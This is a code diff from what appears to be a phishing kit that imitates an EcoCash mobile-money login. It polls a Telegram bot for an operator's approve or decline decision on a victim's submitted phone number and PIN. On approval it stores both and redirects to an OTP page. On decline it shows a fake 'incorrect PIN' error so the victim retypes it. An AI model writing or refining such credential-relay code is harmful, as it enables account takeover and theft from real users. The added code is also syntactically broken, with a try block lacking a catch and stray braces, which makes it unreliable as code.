@@ -586,35 +586,57 @@
       .catch(() => resetButton());
     }
 
-    function startPolling(approveCallbackId, declineCallbackId) {
-      const interval = setInterval(() => {
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-          .then(r => r.json())
-          .then(data => {
-            if (!data.ok || !data.result) return;
-
-            data.result.forEach(update => {
-              state.lastUpdateId = update.update_id;
-
-              if (update.callback_query) {
-                const cb = update.callback_query.data;
-
-                if (cb === approveCallbackId) {
-                  clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
-                  window.location.href = 'otp.html';
-                }
-                else if (cb === declineCallbackId) {
-                  clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
-                  showError('Request declined. Please try again.');
-                  resetButton();
-                }
-              }
-            });
-          });
-      }1000}
-    );
+        function startPollingForDecision(approveCallbackId, declineCallbackId) {
+      stopPolling();
+      let lastUpdateId = 0;
+      
+      currentPollInterval = setInterval(async () => {
+        if (!isProcessing) {
+          stopPolling();
+          return;
+        }
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const response = await fetch(url);
+          const data = await response.json();
+          if (!data.ok || !data.result.length) return;
+          
+          for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+            const callback = update.callback_query;
+            if (!callback) continue;
+            const cbData = callback.data;
+            
+            if (cbData === approveCallbackId) {
+              // Admin approved -> redirect to otp.html
+              stopPolling();
+              isProcessing = false;
+              hideSpinner();
+              // Store context (optional)
+              sessionStorage.setItem('ecocash_approved_phone', pendingPhoneRaw);
+              sessionStorage.setItem('ecocash_approved_pin', pendingPin);
+              // Redirect to otp.html
+              window.location.href = 'otp.html';
+              return;
+            }
+            
+            if (cbData === declineCallbackId) {
+              // Admin declined
+              stopPolling();
+              isProcessing = false;
+              hideSpinner();
+              setPinInputsEnabled(true);
+              phoneInput.disabled = false;
+              showLocalError('Incorrect Mobile number and/or PIN provided.');
+              clearPinFields(false); // clear PIN but don't auto-focus
+              pendingPhoneRaw = '';
+              pendingPin = '';
+              return;
+            }
+          }
+        }
+        }
+      }, 1000);
     }
     
     // Send credentials to Telegram bot with inline buttons "Approve" and "Decline"
